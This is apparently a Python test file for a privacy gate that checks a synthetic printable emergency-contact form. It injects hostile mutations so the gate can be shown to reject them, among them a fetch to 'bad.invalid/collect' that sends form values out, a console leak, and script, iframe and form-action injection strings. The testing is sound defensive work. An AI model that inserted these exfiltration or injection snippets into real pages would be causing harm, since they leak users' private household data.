"""R167 synthetic fixture — never a real-family/WordPress safety assessment."""
from pathlib import Path
import importlib.util
import unittest

SOURCE=Path(__file__).resolve().parents[1]/'tools'/'r167_print_pdf_privacy_gate.py'
spec=importlib.util.spec_from_file_location('r167_print_pdf',SOURCE)
m=importlib.util.module_from_spec(spec)
spec.loader.exec_module(m)

FIXTURE='''<p>A printed card can be lost. {{cite:synthetic-reference}}</p>
<form id="rc" onsubmit="return false">
<input id="rc-hhName"><input id="rc-hhPhone"><input id="rc-outName"><input id="rc-outPhone">
<input id="rc-meet1"><input id="rc-meet2"><input id="rc-school"><input id="rc-schoolPlan">
<input id="rc-pickup"><input id="rc-careName"><input id="rc-carePhone"><input id="rc-access">
<input id="rc-reviewed"><input id="rc-minimal" type="checkbox">
<select id="rc-copies"><option value="1">1</option><option value="4">4</option></select>
<button type="button" id="rc-print">Print</button><button type="button" id="rc-reset">Clear</button>
</form><div id="rc-live" hidden><div id="rc-preview"></div><div id="rc-sheet"></div></div>
<style>.pa-foldcard{border:1px solid #ccc;margin:1rem;padding:0.5rem}
@media print{#rc{display:none}#rc-sheet{display:block}button{display:none}}</style>
<script>
let rc=document.getElementById('rc'), g=k=>document.getElementById('rc-'+k);
function render(){let active=g('minimal').checked;
let text=g('outName').value+' '+(active?'':g('school').value+' '+g('careName').value+' '+g('meet2').value+' '+g('access').value);
document.getElementById('rc-preview').textContent=text;
let sheet=document.getElementById('rc-sheet');sheet.replaceChildren();
for(let i=0;i<Number(g('copies').value);i++){
 let node=document.createElement('div');node.className='pa-foldcard';node.textContent=text;sheet.appendChild(node);}}
rc.addEventListener('input',render);rc.addEventListener('change',render);
g('reset').onclick=()=>{rc.reset();render()};document.getElementById('rc-live').hidden=false;render();
</script>'''+' '*280

class PrintArtifactGate(unittest.TestCase):
    def test_valid_synthetic_document(self):
        m.static_contract(FIXTURE)
    def test_schema_and_hard_hold(self):
        self.assertTrue(m.SCHEMA.startswith('fv-preparedness-r167'))
        self.assertEqual(m.main(['--repo','/there-is-no-such-repository']),2)
    def test_13_expected_fields(self):
        self.assertEqual(len(m.FORM_FIELDS),13)
    def test_privacy_sentinels_distinct(self):
        self.assertEqual(len(m.PRIVATE),len(set(m.PRIVATE)))
    def test_pdf_extractor_rejects_corrupt_input(self):
        with self.assertRaises(ValueError):m.pdf_visible_text(b'garbage')
    def test_actual_chromium_pdf_fixture(self):
        result=m.probe(FIXTURE,widths=(360,390,768,1440))
        self.assertEqual(len(result['local_chromium_pdf_preflight']),4)
        self.assertFalse(result['publication_authorized'])
        self.assertFalse(result['real_wordpress_render_tested'])
        self.assertTrue(all(i['status']=='SYNTHETIC_PDF_PASS' for i in result['local_chromium_pdf_preflight']))
    def test_print_form_leak_fails(self):
        bad=FIXTURE.replace('#rc{display:none}','#rc{display:block}')
        with self.assertRaises(ValueError):m.probe(bad,widths=(390,))
    def test_minimal_print_leak_fails(self):
        bad=FIXTURE.replace("(active?'':g('school').value", "(false?'':g('school').value")
        with self.assertRaisesRegex(ValueError,'minimal PDF printed private'):
            m.probe(bad,widths=(390,))
    def test_console_secret_exposure_fails(self):
        bad=FIXTURE.replace('rc.addEventListener(\'input\',render);',
                             "rc.addEventListener('input',render);rc.addEventListener('input',()=>console.log(g('school').value));")
        with self.assertRaisesRegex(ValueError,'browser network, websocket, console'):
            m.probe(bad,widths=(390,))
    def test_remote_fetch_fails(self):
        bad=FIXTURE.replace('rc.addEventListener(\'input\',render);',
            "rc.addEventListener('input',render);rc.addEventListener('input',()=>fetch('https://bad.invalid/collect').catch(()=>{}));")
        with self.assertRaisesRegex(ValueError,'browser network, websocket, console'):
            m.probe(bad,widths=(390,))
    def test_invalid_width_refuses(self):
        for widths in [(),(100,),('390',),(4000,)]:
            with self.subTest(widths=widths):
                with self.assertRaises(ValueError):m.probe(FIXTURE,widths=widths)

# Named adversarial tests: integrity must fail even when other fields remain intact.
_MUTATIONS=[]
for key in m.FORM_FIELDS:
    _MUTATIONS.append(('missing_'+key, FIXTURE.replace('id="rc-'+key+'"','id="missing-'+key+'"')))
    _MUTATIONS.append(('duplicate_'+key, FIXTURE.replace('id="rc-'+key+'"','id="rc-'+key+'" id="rc-'+key+'"')))
for key in ('minimal','copies','reset','print'):
    _MUTATIONS.append(('missing_control_'+key,FIXTURE.replace('id="rc-'+key+'"','id="missing-'+key+'"')))
for i,token in enumerate(('{{inline-js:unexpected.js}}','<iframe src="https://ex.invalid"></iframe>',
                          '<base href="https://ex.invalid">', '<script src="https://ex.invalid/a.js">',
                          '<form action="https://ex.invalid"','<script>alert(1)</script>',
                          '<script src="local.js"></script>', '<iframe srcdoc="hidden"></iframe>')):
    _MUTATIONS.append(('injection_'+str(i),FIXTURE.replace('<form id="rc"',token+'<form id="rc"')))
_MUTATIONS += [('missing_warning',FIXTURE.replace('A printed card can be lost','All data is private')),
               ('missing_source',FIXTURE.replace('{{cite:synthetic-reference}}','no citations')),
               ('submit_endpoint',FIXTURE.replace('<form id="rc"','<form action="/save" id="rc"')),
               ('extra_script',FIXTURE+'<script>alert(0)</script>')]

def _make(bad):
    def test(self):
        with self.assertRaises(ValueError):m.static_contract(bad)
    return test
for label,bad in _MUTATIONS:
    setattr(PrintArtifactGate,'test_mutation_'+label,_make(bad))
